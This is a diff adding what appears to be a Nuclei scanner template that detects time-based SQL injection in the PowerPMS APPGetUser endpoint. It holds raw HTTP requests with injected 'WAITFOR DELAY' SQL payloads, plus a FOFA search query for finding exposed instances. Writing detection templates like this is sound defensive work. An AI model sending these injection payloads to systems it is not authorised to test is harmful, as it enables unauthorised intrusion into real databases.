@@ -1,0 +1,31 @@
+id: powerpms-appgetuser-sqli
+
+info:
+  name: PowerPMS APPGetUser SQL Injection
+  author: Co5mos
+  severity: high
+  description: |
+    PowerPMS APPGetUser endpoint is vulnerable to SQL injection, allowing an attacker to execute arbitrary SQL commands.
+  metadata:
+    verified: true
+    fofa-query: app="普华科技-PowerPMS"
+  tags: sqli, powerpms
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /APPAccount/APPGetUser?name=1');WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        @timeout: 20s
+        GET /APPAccount/APPGetUser?name=1');WAITFOR+DELAY+'0:0:0'--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration_1 >= 5 && duration_1 < 10
+          - duration_2 < 5
+        condition: and
